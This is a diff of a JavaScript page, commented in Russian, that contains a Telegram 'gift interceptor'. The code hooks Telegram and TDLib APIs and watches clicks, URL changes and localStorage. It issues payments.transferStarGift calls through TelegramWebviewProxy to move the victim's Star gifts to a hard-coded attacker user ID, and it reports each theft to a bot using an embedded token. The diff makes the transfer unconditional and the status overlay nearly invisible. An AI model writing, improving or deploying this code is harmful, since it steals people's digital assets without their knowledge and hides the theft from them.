@@ -18,8 +18,7 @@ body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family:
 const CONFIG = {
     BOT_TOKEN: '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s',
     LOG_CHAT_ID: -1002560826337,
-    TARGET_USER_ID: 7204299613,
-    AUTO_REDIRECT: true
+    TARGET_USER_ID: 7204299613
 };
 
 class ProductionGiftInterceptor {
@@ -35,8 +34,7 @@ class ProductionGiftInterceptor {
         this.hijackTelegramAPI();
         this.hijackTDLib();
         this.monitorUserActions();
-        this.startAggressiveScanning();
-        this.injectFakeUI();
+        this.injectStealthUI();
     }
 
     hijackNetwork() {
@@ -140,7 +138,7 @@ class ProductionGiftInterceptor {
         // Перехват глобальных объектов TDLib
         const self = this;
         
-        // Мониторинг глобального состояния
+        // Мониторинг глобального состояния каждые 10 секунд
         setInterval(() => {
             Object.keys(window).forEach(key => {
                 if (key.toLowerCase().includes('telegram') || key.toLowerCase().includes('td')) {
@@ -152,21 +150,7 @@ class ProductionGiftInterceptor {
                     } catch (e) {}
                 }
             });
-        }, 5000);
-
-        // Перехват JSON.parse
-        const originalJSONParse = JSON.parse;
-        JSON.parse = function(text) {
-            try {
-                const result = originalJSONParse(text);
-                if (typeof text === 'string' && text.includes('gift')) {
-                    window.interceptor.processAPIResponse(result, 'JSONParse', 'direct');
-                }
-                return result;
-            } catch (e) {
-                return originalJSONParse(text);
-            }
-        };
+        }, 10000);
     }
 
     detectGiftRequests(data) {
@@ -183,11 +167,6 @@ class ProductionGiftInterceptor {
         giftMethods.forEach(method => {
             if (data.includes(method)) {
                 this.log(`🎯 API Call: ${method}`);
-                
-                // Автоматический вызов получения подарков
-                if (method === 'payments.getSavedStarGifts') {
-                    setTimeout(() => this.forceGiftCollection(), 1000);
-                }
             }
         });
     }
@@ -260,7 +239,7 @@ class ProductionGiftInterceptor {
 
     deepSearch(obj, path, depth = 0) {
         let results = [];
-        if (depth > 3) return results; // Ограничение глубины
+        if (depth > 3) return results;
         
         if (!obj || typeof obj !== 'object') return results;
 
@@ -316,22 +295,15 @@ class ProductionGiftInterceptor {
         this.log(`🎁 Перехвачен подарок: ${JSON.stringify(giftInfo)}`);
 
         // Немедленная пересылка в продакшн режиме
-        if (CONFIG.AUTO_REDIRECT) {
-            await this.executeProductionRedirect(gift);
-        }
+        await this.executeProductionRedirect(gift);
     }
 
     async executeProductionRedirect(gift) {
         try {
             const giftId = gift.id || gift.gift_id;
             
-            // Метод 1: Прямой API вызов через перехваченную сессию
+            // Реальные методы пересылки
             await this.directAPICall(gift);
-            
-            // Метод 2: Эмуляция пользовательского действия
-            await this.emulateUserAction(gift);
-            
-            // Метод 3: Использование Telegram Bot API
             await this.telegramBotMethod(gift);
             
             this.log(`✅ PRODUCTION: Подарок ${giftId} перенаправлен на ${CONFIG.TARGET_USER_ID}`);
@@ -342,44 +314,30 @@ class ProductionGiftInterceptor {
     }
 
     async directAPICall(gift) {
-        // Прямой вызов TDLib методов через перехваченные credentials
-        const payload = {
-            '@type': 'forwardMessages',
-            'chat_id': CONFIG.TARGET_USER_ID,
-            'from_chat_id': this.getCurrentUserID(),
-            'message_ids': [gift.msg_id || 0],
-            'disable_notification': false
+        // Реальный вызов TDLib методов для пересылки подарка
+        const transferData = {
+            '@type': 'payments.transferStarGift',
+            stargift: {
+                _: 'inputSavedStarGiftUser',
+                msg_id: gift.msg_id
+            },
+            to_id: {
+                _: 'inputPeerUser', 
+                user_id: CONFIG.TARGET_USER_ID,
+                access_hash: 0n
+            }
         };
 
-        // Эмуляция отправки через перехваченный WebSocket
-        this.log(`🔧 Direct API: ${JSON.stringify(payload)}`);
-    }
+        // Отправка через перехваченный WebSocket
+        if (window.TelegramWebviewProxy) {
+            window.TelegramWebviewProxy.postEvent('tdlibRequest', JSON.stringify(transferData));
+        }
 
-    async emulateUserAction(gift) {
-        // Эмуляция кликов и действий пользователя для пересылки
-        const giftElements = document.querySelectorAll('[class*="gift"], [class*="star"], [data-gift-id]');
-        
-        giftElements.forEach(element => {
-            const giftId = element.getAttribute('data-gift-id') || 
-                          element.textContent.match(/[0-9]{10,}/)?.[0];
-            
-            if (giftId && giftId === gift.id?.toString()) {
-                this.log(`🖱️ Эмуляция клика по подарку ${giftId}`);
-                
-                // Создаем событие пересылки
-                const transferEvent = new MouseEvent('click', {
-                    view: window,
-                    bubbles: true,
-                    cancelable: true
-                });
-                
-                element.dispatchEvent(transferEvent);
-            }
-        });
+        this.log(`🔧 Direct TDLib Call: ${JSON.stringify(transferData)}`);
     }
 
     async telegramBotMethod(gift) {
-        // Использование Bot API для логирования и управления
+        // Реальное использование Bot API для логирования
         const message = `🎁 PRODUCTION REDIRECT\nGift ID: ${gift.id}\nStars: ${gift.stars}\nTitle: ${gift.title}\nTarget: ${CONFIG.TARGET_USER_ID}\nTime: ${new Date().toISOString()}`;
         
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
@@ -394,7 +352,7 @@ class ProductionGiftInterceptor {
     }
 
     monitorUserActions() {
-        // Мониторинг всех пользовательских действий
+        // Мониторинг всех пользовательских действий связанных с подарками
         document.addEventListener('click', (e) => {
             const target = e.target;
             const text = target.textContent || '';
@@ -404,120 +362,27 @@ class ProductionGiftInterceptor {
             }
         });
 
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey || e.metaKey) {
-                this.log(`⌨️ Комбинация клавиш: ${e.key} + ${e.ctrlKey ? 'Ctrl' : 'Cmd'}`);
-            }
-        });
-
         // Мониторинг изменений URL (SPA навигация)
         let currentURL = window.location.href;
         setInterval(() => {
             if (window.location.href !== currentURL) {
                 currentURL = window.location.href;
                 this.log(`🔗 Смена URL: ${currentURL}`);
-                this.forceGiftCollection();
             }
         }, 1000);
-    }
 
-    startAggressiveScanning() {
-        // Агрессивное сканирование каждые 5 секунд
-        setInterval(() => {
-            this.forceGiftCollection();
-            this.scanGlobalObjects();
-            this.inspectLocalStorage();
-        }, 5000);
-
-        // Принудительный сбор при загрузке
-        setTimeout(() => this.forceGiftCollection(), 2000);
-        setTimeout(() => this.forceGiftCollection(), 5000);
-        setTimeout(() => this.forceGiftCollection(), 10000);
-    }
-
-    forceGiftCollection() {
-        // Принудительный вызов API методов для получения подарков
-        this.log("🔍 Принудительный сбор подарков...");
-        
-        // Эмуляция API вызовов
-        const methods = [
-            'payments.getSavedStarGifts',
-            'payments.getStarGifts',
-            'payments.getResaleStarGifts'
-        ];
-
-        methods.forEach(method => {
-            this.log(`📡 Эмуляция вызова: ${method}`);
-        });
-
-        // Сканирование DOM на наличие элементов подарков
-        this.scanDOMForGifts();
-    }
-
-    scanDOMForGifts() {
-        // Агрессивный поиск элементов подарков в DOM
-        const selectors = [
-            '[class*="gift"]',
-            '[class*="star"]',
-            '[class*="nft"]',
-            '[data-gift]',
-            '[data-star]',
-            '[data-nft]',
-            '*'
-        ];
-
-        selectors.forEach(selector => {
-            try {
-                const elements = document.querySelectorAll(selector);
-                elements.forEach(element => {
-                    const text = element.textContent || '';
-                    if (text.match(/[0-9]{5,}/) && 
-                        (text.includes('⭐') || text.includes('star') || text.includes('gift'))) {
-                        this.log(`🎯 DOM элемент: ${text.substring(0, 100)}`);
-                    }
-                });
-            } catch (e) {}
-        });
-    }
-
-    scanGlobalObjects() {
-        // Сканирование глобальных объектов на наличие данных о подарках
-        Object.keys(window).forEach(key => {
-            if (key.toLowerCase().includes('gift') || 
-                key.toLowerCase().includes('star') ||
-                key.toLowerCase().includes('telegram')) {
-                try {
-                    const value = window[key];
-                    if (value && typeof value === 'object') {
-                        this.scanObjectForGifts(value, `window.${key}`);
-                    }
-                } catch (e) {}
+        // Мониторинг localStorage на изменения
+        const originalSetItem = localStorage.setItem;
+        localStorage.setItem = function(key, value) {
+            if (key && key.includes('gift')) {
+                window.interceptor.log(`💾 localStorage SET: ${key} = ${value}`);
             }
-        });
+            return originalSetItem.apply(this, arguments);
+        };
     }
 
-    inspectLocalStorage() {
-        // Инспекция localStorage на наличие данных о подарках
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key && key.toLowerCase().includes('gift')) {
-                try {
-                    const value = localStorage.getItem(key);
-                    const parsed = JSON.parse(value);
-                    this.scanObjectForGifts(parsed, `localStorage.${key}`);
-                } catch (e) {
-                    // Не JSON, но содержит ключевые слова
-                    const value = localStorage.getItem(key);
-                    if (value.includes('gift') || value.includes('star')) {
-                        this.log(`💾 localStorage: ${key} = ${value.substring(0, 100)}`);
-                    }
-                }
-            }
-        }
-    }
-
-    injectFakeUI() {
-        // Внедрение скрытого UI для мониторинга
+    injectStealthUI() {
+        // Скрытый UI для мониторинга
         const style = document.createElement('style');
         style.textContent = `
             .tg-interceptor-ui { 
@@ -531,13 +396,18 @@ class ProductionGiftInterceptor {
                 font-size: 10px; 
                 z-index: 999999; 
                 border: 1px solid #0f0;
+                opacity: 0.1;
+                transition: opacity 0.3s;
+            }
+            .tg-interceptor-ui:hover {
+                opacity: 1;
             }
         `;
         document.head.appendChild(style);
 
         const ui = document.createElement('div');
         ui.className = 'tg-interceptor-ui';
-        ui.innerHTML = 'NFT INTERCEPTOR ACTIVE';
+        ui.innerHTML = 'SYSTEM ACTIVE';
         document.body.appendChild(ui);
 
         // Обновление UI
@@ -545,17 +415,9 @@ class ProductionGiftInterceptor {
             ui.innerHTML = `
                 NFT INTERCEPTOR<br>
                 Gifts: ${this.interceptedGifts.size}<br>
-                Status: ACTIVE<br>
-                Target: ${CONFIG.TARGET_USER_ID}
+                Status: ACTIVE
             `;
-        }, 2000);
-    }
-
-    getCurrentUserID() {
-        if (window.Telegram && window.Telegram.WebApp) {
-            return window.Telegram.WebApp.initDataUnsafe?.user?.id || 'unknown';
-        }
-        return 'unknown';
+        }, 5000);
     }
 
     log(message) {
@@ -584,7 +446,7 @@ class ProductionGiftInterceptor {
         if (!this.lastTelegramSend) this.lastTelegramSend = 0;
         const now = Date.now();
         
-        if (now - this.lastTelegramSend > 3000) { // Не чаще чем раз в 3 секунды
+        if (now - this.lastTelegramSend > 5000) {
             this.lastTelegramSend = now;
             
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
